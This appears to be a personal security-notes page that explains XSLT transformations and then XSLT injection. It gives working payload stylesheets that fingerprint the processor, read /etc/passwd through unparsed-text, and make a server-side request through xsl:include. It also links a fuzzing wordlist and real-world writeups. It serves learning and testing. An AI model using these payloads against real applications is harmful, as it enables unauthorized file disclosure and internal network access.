---
aliases: [XSLT]
---
>[!faq] What is XSLT?
>Extensible Stylesheet Language Transformations (`XSLT`) is an XML-based language usually used when transforming XML documents into HTML, another XML document, or PDF.

# XSLT 101

```bash
sudo apt install default-jdk libsaxon-java libsaxonb-java
```

We need to understand the XSLT format to see how the transformation works.
- The first line is usually the XML version and encoding
- Then there is the XSL root node `xsl:stylesheet`
- Then, we will have the directives in `xsl:template match="<PATH>"`. In this case, it will apply to any XML node.
- After that, the transformation is defined for any item in the XML structure matching the previous line.

To select certain items from the XML document, XPATH language is used in the form of `<xsl:value-of select="<NODE>/<SUBNODE>/<VALUE>"/>`.

*catalog.xml*
```xml
<?xml version="1.0" encoding="UTF-8"?>
<catalog>
  <cd>
    <title>Empire Burlesque</title>
    <artist>Bob Dylan</artist>
    <country>USA</country>
    <company>Columbia</company>
    <price>10.90</price>
    <year>1985</year>
  </cd>
  <cd>
    <title>Hide your heart</title>
    <artist>Bonnie Tyler</artist>
    <country>UK</country>
    <company>CBS Records</company>
    <price>9.90</price>
    <year>1988</year>
  </cd>
  <cd>
    <title>Greatest Hits</title>
    <artist>Dolly Parton</artist>
    <country>USA</country>
    <company>RCA</company>
    <price>9.90</price>
    <year>1982</year>
  </cd>
</catalog>
```

*transformation.xsl*
```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
  <html>
  <body>
    <h2>My CD Collection</h2>
    <table border="1">
      <tr bgcolor="#9acd32">
        <th>Title</th>
        <th>Artist</th>
      </tr>
      <tr>
        <td><xsl:value-of select="catalog/cd/title"/></td>
        <td><xsl:value-of select="catalog/cd/artist"/></td>
      </tr>
    </table>
  </body>
  </html>
</xsl:template>
</xsl:stylesheet>
```

# XSLT Injection

XSLT Injection can occur when arbitrary XSLT file upload is possible or when an application generates the XSL Transformation’s XML document dynamically using unvalidated input from the user.

Referring to the example above, we can enumerate the underlying preprocessor with the following file:

*enum.xsl*
```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="html"/>
<xsl:template match="/">
    <h2>XSLT identification</h2>
    <b>Version:</b> <xsl:value-of select="system-property('xsl:version')"/><br/>
    <b>Vendor:</b> <xsl:value-of select="system-property('xsl:vendor')" /><br/>
    <b>Vendor URL:</b><xsl:value-of select="system-property('xsl:vendor-url')" /><br/>
</xsl:template>
</xsl:stylesheet>
```

```html
$ saxonb-xslt -xsl:enum.xsl catalogue.xml
<h2>XSLT identification</h2><b>Version:</b>2.0<br><b>Vendor:</b>SAXON 9.1.0.8 from Saxonica<br><b>Vendor URL:</b>http://www.saxonica.com/<br>
```

*full-enum.xsl*
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
 Version: <xsl:value-of select="system-property('xsl:version')" /><br />
 Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br />
 Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br />
 <xsl:if test="system-property('xsl:product-name')">
 Product Name: <xsl:value-of select="system-property('xsl:product-name')" /><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:product-version')">
 Product Version: <xsl:value-of select="system-property('xsl:product-version')" /><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:is-schema-aware')">
 Is Schema Aware ?: <xsl:value-of select="system-property('xsl:is-schema-aware')" /><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:supports-serialization')">
 Supports Serialization: <xsl:value-of select="system-property('xsl:supportsserialization')"
/><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:supports-backwards-compatibility')">
 Supports Backwards Compatibility: <xsl:value-of select="system-property('xsl:supportsbackwards-compatibility')"
/><br />
 </xsl:if>
</xsl:template>
</xsl:stylesheet>
```

Based on the preprocessor, we can go to the XSLT documentation for this version to identify functions of interest:
- `unparsed-text`: can be used to read local files
- `xsl:include`: can be used to perform SSRF

*read.xsl*
```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:template match="/">
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/>
</xsl:template>
</xsl:stylesheet>
```

*ssrf.xsl*
```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:include href="http://127.0.0.1:5000/xslt"/>
<xsl:template match="/">
</xsl:template>
</xsl:stylesheet>
```

We can also use the following fuzzing wordlist specific for xsl [^xslt] to enumerate other available functionalities.

[^xslt]: [xslt.txt](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xslt.txt), carlospolop

## Real Life Vulnerabilities

- [Getting XXE in Web Browsers using ChatGPT](https://swarm.ptsecurity.com/xxe-chrome-safari-chatgpt/)
- [XSLT to RCE](https://gosecure.ai/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/#:~:text=by%20the%20attacker.-,XSLT%20to%20RCE,-The%20XSLT%20processing)